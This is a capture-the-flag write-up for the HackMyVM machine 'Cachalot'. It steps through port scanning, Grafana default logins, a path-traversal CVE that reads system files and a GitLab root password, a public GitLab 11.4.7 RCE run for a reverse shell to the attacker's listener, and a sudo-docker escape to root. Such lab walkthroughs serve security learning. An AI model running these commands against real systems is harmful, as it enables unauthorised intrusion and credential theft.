# Cachalot

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.7:22
Open 10.0.2.7:3000
Open 10.0.2.7:80
Open 10.0.2.7:5080
Open 10.0.2.7:8080
Open 10.0.2.7:5022
Open 10.0.2.7:9000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.7
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 ba:18:19:f5:08:d0:4d:8a:b2:94:17:79:4c:1e:c4:47 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDO3UqGrOpKxRzNL9HVB+Hb48wt72a7H82KraXs4t0tVUoCjgxVOHeHdJusKuB+f/Azp8WyazYZfxpUgh9sNhA8C7lVXon7jZk4nE7v32Oge98yZm5SQbwwnPgbfy6jKYZD25G1DsStTzFVFHi/kQe0jitJhFy5uqgZ9n3j8W9ExHhLUZhJCJ+uAInqlsayP8Te5S2A1xhZPNGf+6nsw2M38SS5ePWB5n2h6uSYxMTGadsrLtyvdTGzsn9lGzqf14SFosuEaDf0mxgIttkW+rjfqpiPyRSXQ90m6lQt9X1WqBjhQHKx1c4bDJd0CExOODjxaBHnEKzZmA/Tu05N9L1Opt6BnTvZlj+JLRBU18cEEQNsnhgU6XeWZAB4k7LT5/RZipt/Hz/+Mws5WaMlDfCLJFBiG8SZZ+X6Um+Ro/FQpota73JMq4KrvW/I2oorakLus9kTNKBubk48VJU5Dy24z0I8UJ/y6T2JyZdzvZxBBDSBBIb2QmBlP9PFI2+ISM=
|   256 3e:e8:74:93:18:86:75:82:3d:6b:e6:da:34:b8:7e:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFbTWfp5xrBakpPfMbl/qJ1u1c2OLXc6s46Q+H0x1qCG9sEt1QObjGfnoHNprZBx0GN+S+5wb/QnxJZA4vbtAvs=
|   256 81:5c:cf:9f:74:c7:5d:8d:b5:7b:05:76:76:b1:5c:2b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMMKZOnNHhGItrWaXx7yAldY2jIpw17z+WDSQNN1qY0p
80/tcp   open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-title: Cachalot
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
3000/tcp open  http    syn-ack Grafana http
| http-robots.txt: 1 disallowed entry 
|_/
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-favicon: Unknown favicon MD5: 7019620B9CF643E2DFFF86CAEE5A74D6
| http-title: Grafana
|_Requested resource was /login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
5022/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:b0:80:64:72:f0:f1:5b:e4:16:0e:d6:02:92:e7:7a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDD5yT2LNBRY+fTjGCHe4kUUdFprGUf6DZEyzLlD+zgv7PFwSuovFOY7ZHCZCNlONewp55ml5VzfJOHMA0IC7JlY/XCEpmsblysRfJRsa0LoN2s359FlYoj9E1Tu+Gb4XNGHGo+kLvMblOuvpYd0AfnYfL2xhTSOjqJhdL3Pu2ZAi9cgLnnZ/3psYarPt6wTDJHtGlqxiURI5307guWjNv7dm4BwemAWfP41LFNildGUpWZNFDCKxYmyOQHOLeucMrV35zfE79GxeTU4uZCGInW+/bzVVApLH6fPY/vKejqdKNlsRcgQUPu5kXVeoLMMFHTVZpj1Eh2lL3/wgLPBtir
|   256 cc:16:14:b9:d2:93:a6:2f:f7:36:a0:d9:56:e3:05:8e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFf4A1UzEEabQdnfdMKUtOwRuArpkHBxHax3RxInFXbOuRSsmYe0ApXNglTSQ1pfW0BnoHPziITY89bfoshsMPU=
|   256 a2:cc:cf:92:29:b9:76:fb:70:2e:c7:9e:2e:60:42:7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID6N2EAvjfKK6y2V/EW6Qr53EuY8n4VyL3fkE6he9jN2
5080/tcp open  http    syn-ack nginx
| http-robots.txt: 53 disallowed entries (40 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
| /s/ /snippets/new /snippets/*/edit /snippets/*/raw 
| /*/*.git /*/*/fork/new /*/*/repository/archive* /*/*/activity 
| /*/*/new /*/*/edit /*/*/raw /*/*/blame /*/*/commits/*/* 
| /*/*/commit/*.patch /*/*/commit/*.diff /*/*/compare /*/*/branches/new 
| /*/*/tags/new /*/*/network /*/*/graphs /*/*/milestones/new 
| /*/*/milestones/*/edit /*/*/issues/new /*/*/issues/*/edit 
| /*/*/merge_requests/new /*/*/merge_requests/*.patch 
|_/*/*/merge_requests/*.diff /*/*/merge_requests/*/edit
|_http-title: GitLab is not responding (502)
8080/tcp open  http    syn-ack BaseHTTPServer 0.3 (Python 2.7.10)
|_http-server-header: BaseHTTP/0.3 Python/2.7.10
|_http-title: Debug Server
|_http-favicon: Unknown favicon MD5: 7BEF5BF56B29DF8A53C13C664D60AC29
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD
9000/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: containers | docker web-ui
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

Just image?

![writeup.png](/assets/pentest/hackmyvm/cachalot/writeup.png)

Just in case check for stego
```bash
└─$ curl -LOs http://10.0.2.7/background.png
└─$ zsteg background.png
imagedata           .. text: "Qf?(&^>("
[=] nothing :(
```

```bash
└─$ feroxbuster -u http://10.0.2.7 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
200      GET       25l       31w      356c http://10.0.2.7/index.html
301      GET        9l       28w      305c http://10.0.2.7/manual => http://10.0.2.7/manual/
```

## Grafana (3000)

Login with default credentials `admin:admin`

![writeup-1.png](/assets/pentest/hackmyvm/cachalot/writeup-1.png)

Info in the bottom left corner: `Grafana v8.3.0 (914fcedb7)`

Version has few CVEs, scan with nuclei
```yaml
static:
  - type: basicauth
    domains:
      - 10.0.2.7
    username: admin
    password: admin
```

```bash
└─$ nuclei -u http://10.0.2.7:3000 -tags cve,grafana -sf secrets.yaml
[CVE-2025-4123:open-redirect] [http] [high] http://10.0.2.7:3000/public/..%2F%5coast.pro%2F%3f%2F..%2F..
[CVE-2021-43798] [http] [high] http://10.0.2.7:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd
[grafana-detect] [http] [info] http://10.0.2.7:3000/login ["8.3.0"]
```

Only root user, most likely just a container.
```bash
└─$ curl 'http://10.0.2.7:3000/public/plugins/alertlist/../../../../../../../../etc/passwd' --path-as-is -s | grep sh$
root:x:0:0:root:/root:/bin/bash
```

## Docker Web-UI (9000)

This website shows docker containers, allows inspections and other docker actions.

The Grafana has a mount point, which is great because we can LFI

![writeup-2.png](/assets/pentest/hackmyvm/cachalot/writeup-2.png)

The gitlab has a password in mount point

![writeup-3.png](/assets/pentest/hackmyvm/cachalot/writeup-3.png)

```bash
└─$ curl 'http://10.0.2.7:3000/public/plugins/alertlist/../../../../../../../../srv/initial_root_password' --path-as-is
M4st3rR00tS3cr3t0ne^1337^
```

## Gitlab (5080)

> **Note**: Had to increase VM memory for Gitlab to start

> Creds: `root:M4st3rR00tS3cr3t0ne^1337^`

- **[GitLab-11.4.7-RCE](https://github.com/ctrlsam/GitLab-11.4.7-RCE)**
- [LiveOverFlow - GitLab 11.4.7 Remote Code Execution](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)
 
```bash
└─$ git clone -q https://github.com/ctrlsam/GitLab-11.4.7-RCE.git
└─$ py GitLab-11.4.7-RCE/exploit.py -u 'root' -p 'M4st3rR00tS3cr3t0ne^1337^' -g '10.0.2.7' -l '10.0.2.147' -P '4444'
```

The command wasn’t working and I wasn’t getting any callbacks. At this point I was slowly losing my mind, because it _absolutely_ should have worked. I tried different payloads, different commands, adding delays, removing delays, staring at the terminal in silence - nothing.

Then the realization hit me: what if Redis wasn’t working at all?

I shut down the VM, cranked the RAM up to 5 GB, gave it 2 CPUs, powered it back on, waited a solid ten minutes for the universe to realign, fired the payload again… and it worked.

I died. I respawned. I continued.

```bash
└─$ penelope -p 4444
git@gitlab:~/gitlab-rails/working$ id
uid=998(git) gid=998(git) groups=998(git)
```

## Lateral Movement

```bash
git@gitlab:/$ sudo -l
Matching Defaults entries for git on gitlab.cachalot.local:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User git may run the following commands on gitlab.cachalot.local:
    (root) NOPASSWD: /usr/bin/docker
```

```bash
git@gitlab:/$ sudo docker images
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
ubuntu                       18.04               71cb16d32be4        3 years ago         63.1MB
grafana/grafana-enterprise   8.3.0-ubuntu        524526155bfd        4 years ago         371MB
gitlab/gitlab-ce             11.4.7-ce.0         cf1633301167        7 years ago         1.56GB
pottava/docker-webui         latest              3344db67bbf8        8 years ago         20.8MB
whalesalad/docker-debug      latest              6fdc3b7202f0        10 years ago        41.9MB
```

```bash
git@gitlab:/$ sudo docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash
root@58d799883526:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flags

```bash
root@58d799883526:/# cat /home/cachalot/local.txt
64675c29aaa3f6d9d7c68e53706aac5a
```

```bash
root@58d799883526:/# cat /root/proof.txt
02c157a9d76e85bfd03546fb74d0a384
```